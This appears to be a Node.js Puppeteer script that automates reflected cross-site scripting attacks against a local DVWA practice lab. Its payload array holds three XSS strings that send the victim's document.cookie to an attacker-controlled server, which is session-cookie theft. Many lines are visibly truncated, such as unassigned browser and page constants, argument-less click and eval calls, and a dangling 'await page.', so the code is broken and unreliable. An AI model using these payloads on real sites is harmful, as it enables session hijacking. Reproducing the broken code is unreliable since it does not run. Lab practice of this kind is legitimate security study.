const puppeteer = require("puppeteer")
const {targetURL, attackerServer, Levels} = require('./config.js')

// To delay the time for scrapingbot to load contents
const delay = (time) => {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
}
/**
 * This is to practice auto scraping for Cross Site Scripting (Reflected).
 *  
 * @param {str} targetURL DVWA URL locally running in your computer
 * @param {str[]} attacks an array of string (script tags)
 * @param {Levels} level Enum class (Levels) declared on config.js
 */
const xssAutoReflected= async (targetURL, attacks, level) => {

    // Launch a headless Chromium for scraping.
    const browser =
    const page = 
    
    
    // Login to DVWA webpage
    await page.$eval('input[name=username]', el => el.value = 'admin')
    await page.$eval
    

    // Check the Level and set to the value passed as a parameter (level)
    await page.click
    await delay(3000);    
    
    //Try attacks on the array and see whether all the attacks are performed well. 
    for(let i=0; i<attacks.length;i++) {
        console.log(`${i+1}th Attack Start`)
        await page.click
        
        console.log("Sending a user cookie to the backend")
        await page.$eval

        console.log("Sent")
        await page.
    
        await delay(2000);
        console.log(`${i+1}th Attack End`)
        await page.goBack()
    }   
    // Close the browser
    await browser.close();
}

attacksXssReflected = [
    "<script>window.location='"+attackerServer+"/session/'+document.cookie</script>",
    "<SCRIPT>window.location='"+attackerServer+"/session/'+document.cookie</SCRIPT>",
    "<img src/onerror=window.location='"+attackerServer+"/session/'+document.cookie>",
]

xssAutoReflected(targetURL, attacksXssReflected, Levels.low)


